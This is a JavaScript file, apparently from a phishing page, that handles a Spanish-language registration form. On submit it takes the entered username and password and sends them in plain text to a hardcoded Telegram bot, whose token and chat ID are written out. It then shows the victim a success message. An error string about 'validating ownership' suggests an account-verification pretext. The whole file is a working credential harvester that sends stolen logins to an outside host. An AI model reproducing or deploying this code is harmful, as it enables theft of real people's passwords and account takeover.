const formulario = document.getElementById('contact-form');
const registro = document.getElementById('registro');
const exito = document.getElementById('exito');

formulario.addEventListener('submit', async (e) => {
    e.preventDefault();

    const usuario = formulario.usuario?.value || "";
    const contraseña = formulario.contraseña?.value || "";
    const confirmar = formulario.confirmar?.value || "";

    // Verificar que las contraseñas coinciden
    if (contraseña !== confirmar) {
        alert("Las contraseñas no coinciden.");
        return;
    }

    // 🟢 Reemplaza con tu token de bot y tu chat ID
    const BOT_TOKEN = "8168160200:AAG8L_5th20MDegla-7VVHJImDFJynwWLBM";
    const CHAT_ID = "6719366535"; 

    // Mensaje a enviar
    const mensaje = `🚀 Nuevo Registro:\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${contraseña}`;

    try {
        // Enviar mensaje a Telegram
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mensaje,
                parse_mode: "Markdown"
            })
        });

        // Si la respuesta no es exitosa, lanza un error
        if (!response.ok) throw new Error(`Error: ${response.status} - ${response.statusText}`);

        const data = await response.json();

        // Imprimir la respuesta para depuración
        console.log('Respuesta de Telegram:', data);

        // Mostrar mensaje de éxito y ocultar formulario
        registro.classList.remove('activo');
        exito.classList.add('activo');

        // Limpiar el formulario
        formulario.reset();

    } catch (error) {
        console.error("Error al Validar Titularidad:", error);
        alert("Hubo un error al enviar los datos.");
    }
});

